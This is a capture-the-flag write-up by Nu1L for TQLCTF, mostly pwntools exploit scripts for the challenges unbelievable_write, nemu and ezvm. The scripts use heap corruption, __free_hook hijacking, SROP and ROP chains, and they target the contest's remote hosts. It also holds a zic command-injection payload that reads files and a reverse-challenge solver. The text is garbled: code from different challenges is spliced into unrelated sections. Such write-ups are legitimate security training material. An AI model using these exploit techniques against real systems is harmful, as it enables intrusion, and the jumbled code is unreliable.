TQLCTF Writeup By Nu1L
Author:Nu1L
TQLCTF Writeup By Nu1L
Pwn
unbelievable_write
nemu
ezvm
timezone_challenge
Reverse
Tales of the Arrow
Misc
wizard
Ranma½
the Ohio State University
wordle
Web
Simple PHP
Crypto
Signature
OTP
Pwn
unbelievable_write
可以任意offset free，free掉tcache pthread struct然后打got
from pwn import *
# s = process("./pwn")
s = remote("119.23.255.127","20144")
s.sendlineafter(">","2")
s.sendline("-656")
# gdb.attach(s,"b c3\nc")
s.sendlineafter(">","1")
s.sendline(str(0x280))
payload = p64(0x404018)*0x40+p64(0x404080)*0x40
s.sendline(payload)
s.sendline("1")
s.sendline(str(0xa0))
elf = ELF("./pwn")
payload = p64(0x4013BE)+p64(0x401040)+p64(0x401050)
nemu
bss上pmem的溢出
在pmem上构造UB chunk然后覆盖line_read, 通过rl_gets()进⾏任意地址free, 在pmem上写⼊libc地址
打free_劫持WP空闲链表, 完成任意地址分配WP对象, 分配到__free_hook
之后利⽤再次覆盖free_为system地址, 利⽤函数free_wp()的链表插⼊操作覆盖hook
再次利⽤任意地址free执⾏cat flag
s.sendline(payload)
s.sendline("1")
s.sendline(str(0x320))
s.sendline("1111")
s.sendline("3")
s.interactive()
#! /usr/bin/python
# coding=utf-8
import sys
from pwn import *
import requests
context.log_level = 'debug'
context(arch='amd64', os='linux')
def Log(name):
    log.success(name+' = '+hex(eval(name)))
elf = ELF('./nemu')
libc = ELF("./libc.so.6")
if(len(sys.argv)==1):     #local
    cmd = ["./nemu"]
    sh = process(cmd)
else:             #remtoe
    sh = remote("47.107.29.210", 25127)
def GDB():
    gdb.attach(sh, '''
    set directories ./nemu_source_code/nemu/
    telescope 0x86A3FC0
    telescope 0x00000000086a3f30
    #break make_token
    break rl_gets
    #conti
    ''')
def Cmd(n):
    sh.sendline(n)
def WriteBss(offset, val):
    Cmd('set 0x%x 0x%x'%(offset, val&0xFFFFFFFF))
    val>>=32
    Cmd('set 0x%x 0x%x'%(offset+4, val))
#get UB chunk in pmem
Cmd("set 0x8 0x101")
Cmd("set 0x108 0x21")
Cmd("set 0x128 0x21")
#free(UB chunk)
Cmd("set 0x8000b60 0x6A3b90")
#leak libc addr
Cmd("x 0x19")
sh.recvuntil('0x00000019\t')
ub_addr = int(sh.recvuntil('\n').strip()+'68', 16) + 0x7F0000000000
Log('ub_addr')
libc.address = ub_addr - 0x3c4c68
Log('libc.address')
#__free_hook => system
pmem = 0x6a3b80
free_ = 0x86A3FC0
WriteBss(free_ - pmem, libc.symbols['__free_hook']-0x8)  # free_ = addr
Cmd("w 0")  # allocate WP at free_
WriteBss(free_ - pmem, libc.symbols['system'])  # free_ = val
Cmd("d 1")  # trigger wp->next = free_
# system("cat flag")
Cmd("set 0x400 0x20746163")
Cmd("set 0x404 0x67616c66")
Cmd("set 0x8000b60 0x6A3f80")
sh.interactive()
'''
set 0x8 0x4001
set 0x4008 0x31
set 0x4000 0x4000
set 0x8000b60 0x6A3b90
'''
ezvm
⾃⼰造的open那⾥，strcpy可以off by null改ptr，导致溢出
from pwn import *
context.arch = 'amd64'
def read(fd,addr,size):
    sc = '''
        xor eax,eax;
        push {};
        pop rdi;
        mov rsi,{};
        push {};
        pop rdx;
        syscall;
    '''.format(fd,addr,size)
    return sc
def write(fd,addr,size):
    sc = '''
        push 1;
        pop rax;
        push {};
        pop rdi;
        mov rsi,{};
        push {};
        pop rdx;
        syscall;
    '''.format(fd,addr,size)
    return sc
def close(fd):
    sc = '''
        push 3;
        pop rax;
        push {};
        pop rdi;
        syscall;
    '''.format(fd)
    return sc
def insert(name_addr,size):
    sc = '''
        push 2;
        pop rax;
        mov rdi,{};
        push {};
        pop rsi;
        syscall;
    '''.format(name_addr,size)
    return sc
def get_name(idx):
    return 0x7FFFFFFEF000+0x20*idx
sc = ''
sc += read(0,get_name(0),0x20)
sc += insert(get_name(0),0xb0)#3
sc += read(3,get_name(1),0x100)
sc += write(1,get_name(1),8)
sc += read(0,get_name(2),0x20)
sc += insert(get_name(2),0x100)#4
sc += read(0,get_name(3),0x20)
sc += insert(get_name(3),0xb0)#5
sc += read(0,get_name(4),0x300)
sc += close(5)
sc += close(3)
sc += write(4,get_name(4),0x38)
sc += insert(get_name(0),0xb0)
sc += insert(get_name(3),0xb8)
sc += write(5,get_name(4)+0x38,0xb8)
sc += 'mov rdx,0x100;'
sc = asm(sc)
# s = process("./easyvm",env={'LD_PRELOAD':'./libunicorn.so.1'})
s = remote("120.24.82.252","21545")
# gdb.attach(s,"b *$rebase(0x1720)\nc\nd\nb *$rebase(0x1857)\nc\nc\nd\nb free\nc")
s.sendlineafter('Send your code:',sc)
name = '/dev/a'
s.send(name)
sleep(0.5)
libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:]+'\x00\x00')-0x1ec1f0
success(hex(libc.address))
s.send('/dev/'.ljust(0x18,'b'))
sleep(0.5)
s.send('/dev/c')
sleep(0.5)
payload = 
p64(libc.address+0x0000000000154930)+p64(libc.sym['__free_hook']-0x10)+p64(libc.sym['se
tcontext']+61)
sig = SigreturnFrame()
sig.rsp = libc.bss(0x500)
sig.rip = libc.sym['read']
sig.rdi = 0
timezone_challenge
zic，命令注⼊，构造⼀下绕⼀下就可以了
Reverse
Tales of the Arrow
就给了个gen.txt和output.txt
需要找到⼀组输⼊使得输出是output.txt的内容
⾸先get_lit(i)如果输出1/9/17...这些⼀定是负的 因为是pad出来的0bit位
如果3个输出中有1/9/....那么这个1/9/17这样的肯定是错的，因为肯定是负的，那么剩下两个⾥肯定有⼀个是对
的，另⼀个1/4概率是对的，3/4概率是错的。这样可以最少最少恢复掉2/3的bit，刚好能完全恢复的
sig.rsi = libc.bss(0x500)
sig.rdx = 0x300
sig = str(sig)
payload += sig[0x28:]
s.send('A'*0x28+p64(0x81)+p64(libc.sym['__free_hook'])+payload)
pop_rdi = 0x0000000000026b72+libc.address
pop_rsi = 0x0000000000027529+libc.address
pop_rdx_r12 = 0x000000000011c371 + libc.address
payload = p64(pop_rdi)+p64(libc.bss(0x600))+p64(pop_rsi)+p64(0)+p64(libc.sym['open'])
payload += 
p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(libc.bss(0x700))+p64(pop_rdx_r12)+p64(0x100)+p64(0
)+p64(libc.sym['read'])
payload += 
p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc.bss(0x700))+p64(pop_rdx_r12)+p64(0x100)+p64(0
)+p64(libc.sym['write'])
payload = payload.ljust(0x100)+"./flag\x00"
s.send(payload)
s.interactive()
Rule US 2036 2037 ;cat${IFS}/home/ctf/*; Apr lastSun 2:00 1:00 D
Zone Australia/Adelaide 9:30 US aa 
IMDONE
n = int(input())
N = int(input())
x = []
for i in range(N):
Misc
wizard
硬猜
    x.append([int(input()),int(input()),int(input())])
Truth = [-8*i-1 for i in range(n//8)]
for i in range(7*n//8):
    for j in x:
        if ((-j[0] in Truth)+(-j[1] in Truth)+(-j[2] in Truth)==2):
            for k in range(3):
                if (j[k] not in Truth) and (-j[k] not in Truth):
                    Truth += [j[k]]
                    break
            else:
                continue
            break
flag = 0
for i in range(1,n+1):
    if i in Truth:
        flag = 2*flag+1
    else:
        flag = 2*flag
print(bytes.fromhex(hex(flag)[2:]))
from pwn import *
import string
import base64
import math
from libnum import *
import gmpy2
import os
import json
# import random
from libnum import xgcd, solve_crt
from tqdm import tqdm
from hashlib import sha256, md5, sha1
from Crypto.Hash import SHA256
from Crypto.PublicKey import DSA
from Crypto.Cipher import AES
from itertools import product
# from sage.all import *
from Crypto.Util.number import *
import randcrack
import random
from sm4 import SM4Key
# r = remote('hiyoko.quals.seccon.jp', '10042')
# # context(log_level='debug')
ALPHABET = string.ascii_letters + string.digits
# rec = r.recvline().decode().replace(' ', '')
# print(rec)
# rec = rec[rec.find('+')+1::]
# suffix = rec[rec.find('+')+1:rec.find(')')]
# digest = rec[rec.find('==')+2:-1]
# print(f"suffix: {suffix} \ndigest: {digest}")
# for i in product(ALPHABET, repeat=5):
#     prefix = ''.join(i)
#     guess = prefix + suffix
#     if md5(guess.encode()).hexdigest()[0:5] == digest:
#         log.info(f"Find XXXX: {prefix}")
#         break
# r.sendline(prefix.encode())
# r.interactive()
# r.recvline()